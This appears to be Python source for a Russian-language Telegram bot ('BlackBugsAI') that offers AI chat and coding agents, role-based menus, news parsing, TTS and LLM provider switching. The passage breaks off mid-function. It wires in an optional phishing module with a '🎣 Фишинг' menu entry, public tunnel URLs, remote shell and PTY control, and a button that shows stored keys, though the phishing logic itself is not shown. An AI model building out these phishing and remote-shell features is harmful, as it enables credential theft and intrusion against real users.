#!/usr/bin/env python3
"""
bot.py — АВТОМУВИ v2.4 | ИИ чат + агент-кодер + inline UI + Фишинг модуль
"""
import sys
import time
import random
import shutil
from auth_module import (
    is_authenticated,
    auth_state_get,
    auth_handle_text,
    auth_start,
    auth_handle_callback,
    init_auth_db,
    format_profile,
    add_rating,
    set_privilege,
    update_last_seen,
    get_all_users,
    get_user,
    PRIVILEGE_ICONS,
    PRIVILEGE_LABELS,
)
try:
    from admin_module import (
        is_admin, is_owner, require_admin,
        admin_main_keyboard, user_manage_keyboard,
        adm_wait_set, adm_wait_get, adm_wait_clear,
        log_admin_cmd, get_system_info, list_processes,
        kill_process, exec_shell, get_recent_logs,
        format_users_list, ban_user, unban_user, delete_user,
        format_users_list,
    )
    ADMIN_ENABLED = True
except ImportError as _ae:
    ADMIN_ENABLED = False
    def is_admin(cid): return False
    def is_owner(cid): return False
    print(f"⚠️ admin_module не загружен: {_ae}", flush=True)

try:
    from agent_tools_registry import (
        run_agent_with_tools, execute_tool, get_tools_list,
        parse_tool_calls, tool_tts,
    )
    TOOLS_ENABLED = True
except ImportError as _te:
    TOOLS_ENABLED = False
    print(f"⚠️ agent_tools_registry не загружен: {_te}", flush=True)

# ── Новые модули (RBAC, очередь задач, настройки, логирование) ────────────────
try:
    from agent_roles import has_perm, get_role, perm_error, check_daily_tasks, ROLE_PERMS
    ROLES_ENABLED = True
except ImportError as _re:
    ROLES_ENABLED = False
    def has_perm(cid, p): return True
    def get_role(cid): return 'user'
    def perm_error(p, cid): return "🚫 Нет доступа"
    def check_daily_tasks(cid): return True, 0, -1

try:
    from task_queue import (
        create_task, get_task, get_user_tasks, get_all_tasks,
        cancel_task, retry_task, format_task, format_task_list,
        queue_stats, start_workers, get_task_artifacts, artifact_dir,
    )
    QUEUE_ENABLED = True
except ImportError as _qe:
    QUEUE_ENABLED = False
    print(f"⚠️ task_queue не загружен: {_qe}", flush=True)

try:
    from user_settings import (
        get_settings, set_setting, get_user_llm, get_user_system_prompt,
        get_agent_type, AGENT_TYPES, agent_type_keyboard,
        add_memory, get_memory, format_memory, clear_memory,
    )
    USER_SETTINGS_ENABLED = True
except ImportError as _use:
    USER_SETTINGS_ENABLED = False
    def get_agent_type(cid): return 'assistant'
    AGENT_TYPES = {}

try:
    from cloudflare_qr_bot import handle_qr_command, handle_cfqr_callback
    CFQR_ENABLED = True
except ImportError:
    CFQR_ENABLED = False

try:
    import graceful_shutdown as _gs
    GS_ENABLED = True
except ImportError:
    GS_ENABLED = False
    class _gs:
        def setup(): pass
        def register_notify(fn): pass
        def task_start(cid): pass
        def task_done(cid): pass
        def poll_should_stop(): return False
        def active_count(): return 0

try:
    from status_manager import make_status
    STATUS_MGR_ENABLED = True
except ImportError:
    STATUS_MGR_ENABLED = False
    def make_status(chat_id, send_fn, edit_fn, delete_fn=None, prefix=""):
        class _Dummy:
            def update(self, t): send_fn(t, chat_id)
            def append(self, t): send_fn(t, chat_id)
            def done(self, t, keep=False): send_fn(t, chat_id)
            def make_on_status(self, append=True): return lambda m: send_fn(m, chat_id)
        return _Dummy()

try:
    from billing import BillingManager
    import config as _cfg_billing
    BILLING_ENABLED = _cfg_billing.BILLING_ENABLED
except ImportError as _be:
    BILLING_ENABLED = False
    class BillingManager:
        def __init__(self, uid): self.user_id = uid
        @property
        def plan(self): return 'free'
        @property
        def credits(self): return 0.0
        def can_run_task(self): return True, ""
        def charge_task(self, *a, **k): return True
        def format_status(self): return "💳 Биллинг: Free (без лимитов)"
        def billing_keyboard(self): return None

try:
    import agent_core as _agent_core
    AGENT_CORE_ENABLED = True
except ImportError as _ace:
    AGENT_CORE_ENABLED = False
    print(f"  ⚠️ agent_core не загружен: {_ace}", flush=True)

# ── AGENT NEO ─────────────────────────────────────────────────────────────────
try:
    from agent_neo import (
        run_neo, run_neo_async, NeoResult,
        list_tools as neo_list_tools,
        tool_exists as neo_tool_exists,
    )
    NEO_ENABLED = True
    print('  🟢 AGENT NEO загружен', flush=True)
    def _neo_warmup():
        import time as _t; _t.sleep(3)
        try:
            from agent_neo import warmup
            result = warmup()
            print(f"  📚 NEO tools: {result['registered']} зарегистрировано", flush=True)
        except Exception as _we:
            print(f'  ⚠️ NEO warmup: {_we}', flush=True)
    import threading as _thr
    _thr.Thread(target=_neo_warmup, daemon=True, name='neo-warmup').start()
except ImportError as _neo_err:
    NEO_ENABLED = False
    def run_neo(*a, **kw): return None
    def neo_list_tools(): return []
    def neo_tool_exists(n): return False
    print(f'  ⚠️ agent_neo не загружен: {_neo_err}', flush=True)

# ── AGENT MATRIX ──────────────────────────────────────────────────────────────
try:
    from agent_matrix import (
        run_matrix, run_matrix_async, MatrixResult,
        list_tools as matrix_list_tools,
        warmup as matrix_warmup,
    )
    MATRIX_ENABLED = True
    print('  🟥 AGENT MATRIX загружен', flush=True)
    def _matrix_warmup():
        import time as _t; _t.sleep(4)
        try:
            result = matrix_warmup()
            print(f"  🟥 MATRIX tools: {result['registered']} зарегистрировано", flush=True)
        except Exception as _we:
            print(f'  ⚠️ MATRIX warmup: {_we}', flush=True)
    _thr.Thread(target=_matrix_warmup, daemon=True, name='matrix-warmup').start()
except ImportError as _mx_err:
    MATRIX_ENABLED = False
    def run_matrix(*a, **kw): return None
    def matrix_list_tools(): return []
    print(f'  ⚠️ agent_matrix не загружен: {_mx_err}', flush=True)

# ── REMOTE CONTROL ────────────────────────────────────────────────────────────
try:
    from remote_control import (
        ShellSession, get_session, close_session, check_command_allowed,
        get_system_info, format_system_info,
        docker_list, docker_action, docker_stats, format_docker_list,
        pty_start, pty_write, pty_stop, pty_is_active,
    )
    RC_ENABLED = True
    print('  🖥 Remote Control загружен', flush=True)
except ImportError as _rc_err:
    RC_ENABLED = False
    print(f'  ⚠️ remote_control не загружен: {_rc_err}', flush=True)

try:
    from cloudflare_qr_bot import handle_qr_command as cf_bot
    from cloudflare_qr_bot import handle_cfqr_callback
    handle_cloudflared_command = handle_qr_command
    send_qr_to_user = lambda uid, port=None: handle_qr_command(uid, port or int(os.environ.get('TUNNEL_TARGET_PORT', 80)))
    send_qr_to_all  = lambda port=None: None
    CF_BOT_ENABLED = True
except ImportError as _cfe:
    CF_BOT_ENABLED = False

try:
    import structured_logger as slog
    LOG = slog.ComponentLogger('bot')
    SLOG_ENABLED = True
except ImportError:
    SLOG_ENABLED = False
    class _FakeLog:
        def info(self,*a,**k): pass
        def warn(self,*a,**k): pass
        def error(self,*a,**k): pass
        def debug(self,*a,**k): pass
    LOG = _FakeLog()
import asyncio

R       = "\033[0m"
B       = "\033[1m"
BLOOD   = "\033[38;2;139;0;0m"
SCARLET = "\033[38;2;180;20;20m"
RED     = "\033[38;2;220;50;50m"
ROSE    = "\033[38;2;255;80;80m"
DARK    = "\033[38;2;60;0;0m"
WHITE   = "\033[97m"
SMOKE   = "\033[38;2;100;70;70m"

def ink(text, *codes):
    return "".join(codes) + text + R

DRIP_SHAPES = [
    ["▓", "▒", "│", "│", "●"],
    ["█", "▓", "▒", "│", "◆"],
    ["▓", "│", "│", "╎", "◉"],
    ["▒", "░", "│", "●"],
    ["▓", "▒", "●"],
    ["█", "▓"],
]

def make_drips(width, n):
    positions = sorted(random.sample(range(1, width - 1), min(n, width - 2)))
    return [(p, random.choice(DRIP_SHAPES)) for p in positions]

def drip_row(drips, row, width):
    buf = [" "] * width
    for pos, shape in drips:
        if row >= len(shape):
            continue
        ch = shape[row]
        if row == 0:
            buf[pos] = ink(ch, BLOOD, B)
        elif row == len(shape) - 1:
            buf[pos] = ink(ch, SCARLET)
        else:
            buf[pos] = ink(ch, RED)
    return "".join(buf)

ROW_COLORS = [BLOOD, BLOOD, SCARLET, SCARLET, RED, RED, ROSE, SCARLET, BLOOD, BLOOD, BLOOD]

def colorize(line, row_idx):
    col = ROW_COLORS[min(row_idx, len(ROW_COLORS) - 1)]
    out = ""
    for ch in line:
        if ch == " ":
            out += " "
        elif ch in "d8PY'\"":
            out += ink(ch, ROSE)
        elif ch in "`.,":
            out += ink(ch, DARK)
        else:
            out += ink(ch, col, B)
    return out

def print_banner():
    tw = shutil.get_terminal_size((120, 40)).columns
    PAD = 1

    # Импортируем pyfiglet — если нет, рисуем ASCII-баннер вручную
    try:
        import pyfiglet as _pf
    except ImportError:
        _pf = None

    def process(raw):
        lines = raw.split("\n")
        while lines and not lines[-1].strip(): lines.pop()
        while lines and not lines[0].strip():  lines.pop(0)
        return lines

    if _pf:
        l1 = process(_pf.figlet_format("mr", font="colossal"))
        l2 = process(_pf.figlet_format("Zinevits", font="colossal"))
    else:
        l1 = ["  ___ ___  "]
        l2 = ["  BlackBugsAI  "]

    logo_w = max(max(len(l) for l in l1), max(len(l) for l in l2))
    box_w  = min(logo_w + 6, tw - PAD * 2)
    indent = " " * PAD

    def emit(line, delay=0.018):
        sys.stdout.write(indent + line + "\n")
        sys.stdout.flush()
        time.sleep(delay)

    print()

    # TOP DRIPS
    drips_top = make_drips(box_w, 28)
    max_top = max(len(s) for _, s in drips_top)
    for row in range(max_top):
        emit(drip_row(drips_top, row, box_w), 0.022)

    # BOX
    BOX_T  = ink("╔" + "═" * (box_w - 2) + "╗", BLOOD, B)
    BOX_B  = ink("╚" + "═" * (box_w - 2) + "╝", BLOOD, B)
    SEP    = ink("╠", BLOOD, B) + ink("─" * (box_w - 2), SCARLET) + ink("╣", BLOOD, B)
    SEP2   = ink("╠", BLOOD, B) + ink("╍" * (box_w - 2), DARK)    + ink("╣", BLOOD, B)
    SIDE   = lambda txt: ink("║", BLOOD, B) + " " + txt + " " + ink("║", BLOOD, B)

    emit(BOX_T, 0.01)

    # mr. subtitle row
    mr_inner = ink("· · ·  mr  · · ·".center(box_w - 4), ROSE, B)
    emit(SIDE(mr_inner), 0.01)
    emit(SEP, 0.01)

    # mr. logo
    for i, line in enumerate(l1):
        emit(SIDE(colorize(line.center(box_w - 4), i + 3)), 0.03)

    emit(SEP2, 0.01)

    # Zinevits logo
    for i, line in enumerate(l2):
        emit(SIDE(colorize(line.center(box_w - 4), i)), 0.028)

    emit(SEP, 0.01)

    # tagline
    tag = ink("~ кровью и болью ~".center(box_w - 4), SMOKE)
    emit(SIDE(tag), 0.015)

    emit(BOX_B, 0.01)

    # BOTTOM DRIPS
    drips_bot = make_drips(box_w, 32)
    max_bot = max(len(s) for _, s in drips_bot)
    for row in range(max_bot):
        emit(drip_row(drips_bot, row, box_w), 0.035)

    # PUDDLE
    pool = "".join(random.choice("≋≈~≋≈≋~≈") for _ in range(box_w))
    emit(ink(pool, BLOOD), 0.01)
    print()

    # FOOTER
    left  = ink("🏌️‍♂️  by mr Zinevits", SCARLET)
    right = ink("v0.6.6  ⚾️", SMOKE)
    gap   = max(box_w - 18 - 10, 2)
    emit(left + " " * gap + right, 0)
    print()

if __name__ == "__main__":
    print_banner()
import time, threading, schedule, os, subprocess, re, shutil
try:
    from database import init_db, get_stats, get_today_count
except ImportError:
    def init_db(): pass
    def get_stats(): return {}
    def get_today_count(): return 0

try:
    from news_parser import parse_all
except ImportError as _npe:
    print(f"  ⚠️ news_parser не загружен: {_npe}", flush=True)
    def parse_all(): return []

try:
    from pipeline import run_pipeline
except ImportError as _ppe:
    print(f"  ⚠️ pipeline не загружен: {_ppe}", flush=True)
    def run_pipeline(*a, **k): return None
from telegram_client import (
    get_updates, send_message, answer_callback,
    edit_message, delete_webhook, send_document, download_file
)
from file_agent import analyze_file, get_dest_path, UPLOADS_DIR
try:
    from llm_checker import check_all, format_check_results, check_provider, RECOMMENDED
except ImportError:
    def check_all(*a,**k): return {}
    def format_check_results(*a,**k): return "❌ llm_checker не загружен"
    def check_provider(*a,**k): return {'ok': False, 'error': 'unavailable'}
    RECOMMENDED = []
try:
    from providers_hub import hub as _prov_hub
except ImportError:
    _prov_hub = None
try:
    from model_discovery import (discover_all, save_cache, load_cache, get_models,
                                   get_free_openrouter, format_discovery_report, CACHE_FILE,
                                   get_openrouter_models_cached, fetch_ollama_models,
                                   fetch_any_provider_models, format_models_summary,
                                   format_free_models_keyboard)
    MODEL_DISCOVERY_ENABLED = True
except ImportError:
    MODEL_DISCOVERY_ENABLED = False
    def discover_all(*a,**k): return {}
    def save_cache(*a,**k): pass
    def load_cache(*a,**k): return {}
    def get_models(*a,**k): return []
    def get_free_openrouter(*a,**k): return []
    def format_discovery_report(*a,**k): return "❌ model_discovery не загружен"
    def get_openrouter_models_cached(*a,**k): return []
    def fetch_ollama_models(*a,**k): return []
    def fetch_any_provider_models(*a,**k): return []
    def format_models_summary(*a,**k): return ""
    def format_free_models_keyboard(*a,**k): return None
    CACHE_FILE = ''

try:
    from tts_engine import list_russian_voices, eleven_list_voices
except ImportError:
    def list_russian_voices(*a,**k): return []
    def eleven_list_voices(*a,**k): return []

try:
    from llm_client import test_connection, check_all_providers
except ImportError:
    def test_connection(*a,**k): return False
    def check_all_providers(*a,**k): return {}

import config

try:
    from promts import STYLES, TTS_LANGUAGES
except ImportError:
    STYLES = {}
    TTS_LANGUAGES = {'ru': {'name': 'Русский', 'voices': []}}

try:
    from updater import (check_dependencies, upgrade_core,
                         get_bot_info, format_deps_report, format_bot_info,
                         install_package)
except ImportError:
    def check_dependencies(): return {}
    def upgrade_core(): return "❌ updater не загружен"
    def get_bot_info(): return {}
    def format_deps_report(*a): return "❌ updater не загружен"
    def format_bot_info(*a): return ""
    def install_package(pkg): return f"pip install {pkg}"

try:
    from msg_sender import (send_to_user, send_to_channel, send_file_to, send_photo_to,
                            forward_message, schedule_message, get_scheduled, broadcast)
    MSG_SENDER_ENABLED = True
except ImportError:
    MSG_SENDER_ENABLED = False
    def send_to_user(*a,**k): pass
    def send_to_channel(*a,**k): pass
    def send_file_to(*a,**k): pass
    def send_photo_to(*a,**k): pass
    def forward_message(*a,**k): pass
    def schedule_message(*a,**k): pass
    def get_scheduled(*a,**k): return []
    def broadcast(*a,**k): pass
try:
    from image_gen import generate_image, get_available_providers as get_image_providers
    IMAGE_GEN_ENABLED = True
except ImportError:
    IMAGE_GEN_ENABLED = False
    def generate_image(*a, **k): return None, 'unavailable'
    def get_image_providers(): return []
# msg_sender loaded above with try/except

from chat_agent import (
    start_session, end_session, get_session, is_active, session_info,
    chat_respond, code_agent_run, format_code_result, all_active_sessions
)

# ── Фишинг-модуль (опционально — не падает если зависимости отсутствуют) ──
try:
    import fish_bot_state
    import fish_db
    from fish_downloader import downloader as fish_downloader
    import fish_utils
    import fish_config as _fish_cfg
    FISH_ENABLED = True
except ImportError as _fe:
    FISH_ENABLED = False
    print(f"  ⚠️ Фишинг-модуль не загружен: {_fe}", flush=True)

# ── Состояния ожидания ввода (chat_id -> ключ состояния) ──────
_BOT_START_TIME = time.time()  # для отображения аптайма в диагностике
_wait_state = {}  # обычный dict, без аннотации типов — совместимо с Python 3.7+
_yt_pending_url = {}  # chat_id → URL пока пользователь выбирает формат
_fm_cache  = {}        # короткий id → полный путь (обход лимита 64б кнопок Telegram)
_mdl_cache = {}        # shortid → 'provider:model' (обход лимита 64б для длинных моделей)
_img_settings = {}    # chat_id → {size, style_suffix}
_pending_agent_task = {}  # chat_id -> {'task': str, 'mode': 'chat'|'code'}
_pending_file       = {}  # chat_id -> {'path': str, 'filename': str, 'analysis': str}
_brain_tasks        = {}  # key -> {'agent': str, 'task': str, 'answer': str} для RLHF фидбека
_fish_user_data     = {}  # chat_id -> {'file_id': int}  — для фишинг-сессий
_fish_user_opts     = {}  # chat_id -> options dict
_task_lock = threading.Lock()


def _strip_think(text):
    """Убирает <think>...</think> блоки (DeepSeek R1, Qwen3, etc.)."""
    import re
    text = re.sub(r'<think>.*?</think>', '', str(text), flags=re.DOTALL)
    text = re.sub(r'<think>.*$', '', text, flags=re.DOTALL)
    return text.strip()


# ══════════════════════════════════════════════════════════════
#  СТРОИТЕЛИ КЛАВИАТУР
# ══════════════════════════════════════════════════════════════

def kb(*rows):
    """Собирает InlineKeyboardMarkup из рядов кнопок."""
    return {"inline_keyboard": list(rows)}

def btn(text, data):
    """Одна inline-кнопка."""
    return {"text": text, "callback_data": data}

def back_btn(dest="menu"):
    return btn("◀️ Назад", dest)


def btn_model(label, provider, model):
    """Кнопка выбора модели с автоматическим кешированием длинных ID.
    Если callback_data > 60 байт — используем _mdl_cache."""
    raw = "llm_setmodel:{}:{}".format(provider, model)
    if len(raw.encode()) <= 60:
        return btn(label, raw)
    # Кеш: ищем существующий ключ
    key_val = "{}:{}".format(provider, model)
    existing = next((k for k, v in _mdl_cache.items() if v == key_val), None)
    if not existing:
        existing = "m{}".format(len(_mdl_cache))
        _mdl_cache[existing] = key_val
    return btn(label, "llm_m:{}".format(existing))


def menu_keyboard(chat_id=None):
    """Главное меню — адаптивное по роли, красивый дизайн."""
    try:
        from roles import has_perm as _hp
        from admin_module import get_role as _gr
        role = _gr(chat_id) if chat_id else 'user'
        hp = lambda p: _hp(role, p)
    except Exception:
        role = 'user'
        hp = lambda p: True

    # BAN
    if role == 'ban':
        return kb(
            [btn("💰 Оплатить штраф",   "pay_fine")],
            [btn("👤 Профиль",          "profile")],
            [btn("❓ Помощь",           "help")],
        )
    # NOOB
    if role == 'noob':
        return kb(
            [btn("👤 Мой профиль",      "profile"),
             btn("💳 Биллинг",          "billing:status")],
            [btn("❓ Справка",          "help")],
        )

    rows = []

    # ── AI / Агенты ──
    if hp('chat') or hp('code_agent'):
        row1, row2 = [], []
        if hp('chat'):       row1.append(btn("💬 ИИ-Чат",        "agent_chat_start"))
        if hp('code_agent'): row1.append(btn("💻 Агент-Кодер",   "agent_code_start"))
        if row1: rows.append(row1)

    # NEO + MATRIX (VIP+)
    if hp('smith_agent'):
        row = []
        if NEO_ENABLED:    row.append(btn("🟢 AGENT NEO",    "neo_start"))
        if MATRIX_ENABLED: row.append(btn("🟥 AGENT MATRIX", "matrix_start"))
        if row: rows.append(row)

    # MORPHEUS (owner/god only — root system agent)
    try:
        from auth_module import get_user_privilege as _gup_m
        _morph_priv = _gup_m(chat_id) or 'user'
    except Exception:
        _morph_priv = 'user'
    if _morph_priv in ('god', 'owner', 'adm'):
        rows.append([btn("🔵 AGENT MORPHEUS", "morpheus_start")])

    # Remote Control (ADM+)
    if RC_ENABLED and hp('admin_panel'):
        rows.append([btn("🖥 Remote Control", "rc_menu")])

    # Медиа
    if hp('image_gen') or hp('tts'):
        row = []
        if hp('image_gen'): row.append(btn("🎨 Картинки",        "menu_image"))
        if hp('tts'):        row.append(btn("🎙 TTS озвучка",     "menu_tts"))
        if row: rows.append(row)

    # LLM + СМИТ (VIP+)
    if hp('llm_change') or hp('smith_agent'):
        row = []
        if hp('llm_change'):  row.append(btn("🧠 LLM",           "menu_llm"))
        if hp('smith_agent'): row.append(btn("🕵️ АГЕНТ_СМИТ",   "adm:smith_menu"))
        if row: rows.append(row)

    if hp('tools_advanced'):
        rows.append([btn("🔧 Инструменты",  "menu_tools"),
                     btn("📋 Задачи",       "tasks:list")])

    # ── ADM+ ──
    if hp('manage_bots'):
        rows.append([btn("🚀 Запустить цикл","run"),
                     btn("📡 Парсинг",       "parse")])
    if hp('fish_module'):
        rows.append([btn("🎣 Фишинг",        "menu_fish"),
                     btn("🩺 Диагностика",   "selfcheck")])
    if hp('view_logs'):
        rows.append([btn("🔄 Обновление",    "menu_update"),
                     btn("📊 Логи",          "adm:logs")])

    # ── GOD ──
    if hp('view_env'):
        rows.append([btn("🔐 .env / Ключи",  "adm:show_keys"),
                     btn("⚡ GOD панель",    "adm:god_panel")])

    # ── Всегда ──
    rows.append([btn("👤 Профиль",           "profile"),
                 btn("💳 Биллинг",           "billing:status")])
    rows.append([btn("❓ Справка",           "help")])
    if hp('admin_panel'):
        rows.append([btn("🔑 Администрирование", "admin")])

    return kb(*rows)


def style_keyboard():
    current = _get_env_style()
    rows = []
    keys = list(STYLES.keys())
    for i in range(0, len(keys), 2):
        pair = keys[i:i+2]
        row = []
        for k in pair:
            s = STYLES[k]
            mark = " ✅" if k == current else ""
            row.append(btn("{} {}{}".format(s['emoji'], s['name'], mark), "style:{}".format(k)))
        rows.append(row)
    rows.append([btn("✏️ Задать свой промт", "set_custom_prompt")])
    rows.append([back_btn()])
    return kb(*rows)


def tts_keyboard():
    provider = (config.TTS_PROVIDER or 'edge').lower().strip()
    edge_mark = " ✅" if provider == 'edge' else ""
    eleven_mark = " ✅" if provider != 'edge' else ""
    return kb(
        [btn("edge-tts (бесплатно){}".format(edge_mark), "tts_prov:edge"),
         btn("ElevenLabs{}".format(eleven_mark),          "tts_prov:elevenlabs")],
        [btn("🌍 Язык озвучки (edge)",  "menu_lang")],
        [btn("🎙 Сменить голос",        "set_voice")],
        [btn("📋 Список голосов",       "voices")],
        [back_btn()],
    )


def lang_keyboard():
    current = (os.environ.get('TTS_LANGUAGE', 'ru') or 'ru').lower()
    rows = []
    keys = list(TTS_LANGUAGES.keys())
    for i in range(0, len(keys), 2):
        pair = keys[i:i+2]
        row = []
        for k in pair:
            l = TTS_LANGUAGES[k]
            mark = " ✅" if k == current else ""
            row.append(btn("{}{}".format(l['name'], mark), "lang:{}".format(k)))
        rows.append(row)
    rows.append([back_btn("menu_tts")])
    return kb(*rows)


def llm_keyboard():
    cur = config.LLM_PROVIDER.lower().strip()
    cur_m = config.LLM_MODEL
    def lbl(name, key):
        mark = " ✅" if cur == key else ""
        return btn("{}{}".format(name, mark), "llm_info:{}".format(key))
    # Быстрые кнопки для топ-моделей (провайдер + модель за 1 клик)
    from llm_checker import RECOMMENDED as _REC
    def quick(emoji, prov, model_idx=0):
        models = _REC.get(prov, [])
        if not models: return None
        m = models[min(model_idx, len(models)-1)]
        mark = " ✅" if (cur == prov and cur_m == m) else ""
        return btn_model("{} {}{}".format(emoji, prov.upper(), mark), prov, m)
    q_groq  = quick("⚡", "groq")
    q_gem   = quick("💎", "gemini")
    q_cbr   = quick("🧠", "cerebras")
    q_or    = quick("🌐", "openrouter", 4)  # free model
    q_snova = quick("🔥", "sambanova")
    q_ds    = quick("🐋", "deepseek")
    quick_rows = []
    row1 = [b for b in [q_groq, q_gem] if b]
    row2 = [b for b in [q_cbr, q_or] if b]
    row3 = [b for b in [q_snova, q_ds] if b]
    if row1: quick_rows.append(row1)
    if row2: quick_rows.append(row2)
    if row3: quick_rows.append(row3)
    return kb(
        *quick_rows,
        # ── Все провайдеры (для ручного выбора) ──────────
        [lbl("🔵 OpenAI",   "openai"),  lbl("🟣 Claude",    "claude")],
        [lbl("🟡 Mistral",  "mistral"), lbl("✖ xAI",        "xai")],
        [lbl("🦙 Llama",   "llama"),   lbl("🤖 Ollama",    "ollama")],
        [btn("📋 Все провайдеры",  "llm_all_providers")],
        # ── Действия ─────────────────────────────────────
        [btn("🔑 Добавить API ключ","llm_add_key"),
         btn("✏️ Ввести вручную",   "set_llm")],
        [btn("🔍 Проверить все",     "llm_check"),
         btn("🆓 Бесплатные",        "llm_free")],
        [btn("🧪 Тест текущего",    "test"),
         btn("🔄 Выбрать модель",   "llm_pick_current")],
        [back_btn()],
    )

def project_mode_keyboard():
    """Выбор режима генерации проекта перед стартом."""
    return kb(
        [btn("🧩 Двухэтапный план",    "proj_mode:plan")],
        [btn("📄 Один файл за раз",    "proj_mode:onebyone")],
        [btn("🏗 Скаффолдер-скрипт",  "proj_mode:scaffold")],
        [btn("❌ Отмена",              "proj_mode:cancel")],
    )


def agent_keyboard(chat_id=None):
    """Подменю ИИ-агента."""
    active = is_active(chat_id) if chat_id else False
    info = session_info(chat_id) if active else None
    rows = []
    if active and info:
        mode_label = "💬 Чат" if info['mode'] == 'chat' else "💻 Кодер"
        rows.append([btn("🟢 Сессия: {} | {} сообщ. | {}".format(
            mode_label, info['messages'], info['elapsed']), "agent_status")])
        rows.append([btn("🔴 Завершить сессию", "agent_end")])
    else:
        rows.append([btn("💬 ИИ-чат",           "agent_chat_start"),
                     btn("💻 Агент-кодер",       "agent_code_start")])
    rows.append([btn("🎬 YouTube → MP3/MP4",   "agent_youtube_start")])
    rows.append([btn("📁 Файловый менеджер",   "fm:open:~")])
    rows.append([btn("🔧 Инструменты бота",    "agent_tools_menu")])
    rows.append([btn("ℹ️ Как пользоваться",   "agent_help")])
    rows.append([back_btn()])
    return kb(*rows)


def after_file_keyboard():
    """Что делать с файлом после анализа."""
    return kb(
        [btn("🔍 Найти ошибки",        "file_action:review"),
         btn("🔧 Исправить ошибки",    "file_action:fix")],
        [btn("📖 Объяснить код",       "file_action:explain"),
         btn("🚀 Улучшить/расширить",  "file_action:improve")],
        [btn("🏗 Создать на основе",    "file_action:build"),
         btn("✏️ Свой запрос",         "file_action:custom")],
        [btn("🔴 Закрыть",             "file_action:close")],
    )


def chat_control_keyboard(mode='chat'):
    """Кнопки управления внутри ИИ-сессии."""
    rows = [
        [btn("🗑 Очистить историю", "agent_clear"),
         btn("🔴 Завершить",        "agent_end")],
        [btn("📊 Статус сессии",   "agent_status"),
         btn("◀️ Главное меню",    "menu")],
    ]
    if mode == 'chat':
        rows.insert(1, [
            btn("🌐 Поиск в сети",   "chat_fn:websearch"),
            btn("📁 Мои файлы",      "fm:open:~"),
        ])
        rows.insert(2, [
            btn("🔧 Инструменты",    "agent_tools_menu"),
            btn("🎭 Сменить роль",   "chat_fn:persona"),
        ])
    return kb(*rows)




# ══════════════════════════════════════════════════════════════
#  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ══════════════════════════════════════════════════════════════

def _get_env_style():
    return os.environ.get('REWRITE_STYLE', 'troll').lower().strip()


def _update_env(key, value):
    """Пишет в .env и сразу обновляет os.environ — без перезапуска."""
    path = config.ENV_PATH
    try:
        lines = []
        if os.path.exists(path):
            with open(path, 'r') as f:
                lines = f.readlines()
        updated = False
        for i, line in enumerate(lines):
            if line.startswith('{}='.format(key)):
                lines[i] = '{}={}\n'.format(key, value)
                updated = True
                break
        if not updated:
            lines.append('{}={}\n'.format(key, value))
        with open(path, 'w') as f:
            f.writelines(lines)
        os.environ[key] = value
        print("  💾 .env: {}={}{}".format(
            key, value[:30], '...' if len(value) > 30 else ''), flush=True)
    except Exception as e:
        print("  ⚠️ .env update error: {}".format(e), flush=True)


def _run_in_thread(fn, *args):
    def wrapper():
        with _task_lock:
            try:
                fn(*args)
            except Exception as e:
                import traceback as _tb
                print("❌ Thread error: {}".format(e), flush=True)
                print(_tb.format_exc()[:500], flush=True)
    threading.Thread(target=wrapper, daemon=True).start()


def _current_status_text(chat_id=None):
    """Умный красивый статус — адаптируется под роль и активные сессии."""
    try:
        total, sent = get_stats()
        today = get_today_count()
    except Exception:
        total, sent, today = '?', '?', '?'

    # Роль пользователя
    try:
        from admin_module import get_role
        from roles import role_icon, role_label, ROLE_ICONS
        role = get_role(chat_id) if chat_id else 'user'
        r_icon  = role_icon(role)
        r_label = role_label(role)
    except Exception:
        role, r_icon, r_label = 'user', '👤', 'Пользователь'

    # LLM
    llm_line = f"<code>{config.LLM_PROVIDER}/{config.LLM_MODEL}</code>"

    # TTS
    provider = (config.TTS_PROVIDER or 'edge').lower()
    if provider in ('eleven', 'elevenlabs', '11labs'):
        tts_line = f"ElevenLabs <code>{config.ELEVEN_VOICE_ID or '—'}</code>"
    else:
        lang = os.environ.get('TTS_LANGUAGE', 'ru')
        tts_line = f"edge-tts <code>{config.TTS_VOICE}</code>"

    # Аптайм
    up = int(time.time() - _BOT_START_TIME)
    h, r2 = divmod(up, 3600); m2, _ = divmod(r2, 60)
    up_str = f"{h}ч {m2}м" if h else f"{m2}м"

    # Активные сессии
    try:
        sess_n = len(all_active_sessions())
        sess_str = f"\n💬 Активных сессий: <b>{sess_n}</b>" if sess_n else ""
    except Exception:
        sess_str = ""

    # Тоннель
    tunnel_str = ""
    try:
        import fish_bot_state as _fbs
        tu = _fbs.tunnel_url or _fbs.bore_url or _fbs.ngrok_url or _fbs.serveo_url
        if tu:
            tunnel_str = f"\n🌐 Тоннель: <code>{tu[:40]}</code>"
    except Exception:
        pass

    import sys as _s
    plat = "🪟" if _s.platform == 'win32' else ("📱" if os.path.isdir('/data/data/com.termux') else "🐧")

    return (
        f"🖤🐛 <b>BlackBugsAI</b>  {plat}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{r_icon} <b>{r_label}</b>\n"
        f"🧠 {llm_line}\n"
        f"🎙 {tts_line}\n"
        f"📰 Новостей: <b>{total}</b>  Сегодня: <b>{today}</b>  Отправлено: <b>{sent}</b>\n"
        f"⏱ Аптайм: <b>{up_str}</b>"
        f"{sess_str}{tunnel_str}"
    )


# ══════════════════════════════════════════════════════════════
#  ЗАДАЧИ (выполняются в фоновом потоке)
# ══════════════════════════════════════════════════════════════

def task_parse(chat_id):
    send_message("📡 Парсю новости...", chat_id)
    n = parse_all()
    send_message("✅ Новых новостей: <b>{}</b>".format(n), chat_id)

def task_process(chat_id):
    send_message("⚙️ Обрабатываю накопленные новости...", chat_id)
    n = run_pipeline()
    send_message("✅ Обработано: <b>{}</b>".format(n), chat_id)

def task_run(chat_id):
    send_message("🚀 Полный цикл запущен...", chat_id)
    new = parse_all()
    send_message("📡 Спарсено: <b>{}</b>\n⚙️ Обрабатываю...".format(new), chat_id)
    done = run_pipeline()
    total, sent = get_stats()
    send_message(
        "✅ Цикл завершён!\n"
        "🆕 Новых: {} | ⚙️ Обработано: {}\n"
        "📦 В базе: {} | 📤 Отправлено: {}".format(new, done, total, sent),
        chat_id)

def task_check_providers(chat_id):
    send_message("🔍 Проверяю все провайдеры параллельно...", chat_id)
    results = check_all_providers(dict(os.environ))
    report = format_check_results(results)
    # Предлагаем переключиться на рабочий провайдер
    ok_providers = [r['provider'] for r in results if r['ok']]
    markup = None
    if ok_providers:
        btns = [btn("→ {}".format(p), "llm_info:{}".format(p)) for p in ok_providers[:4]]
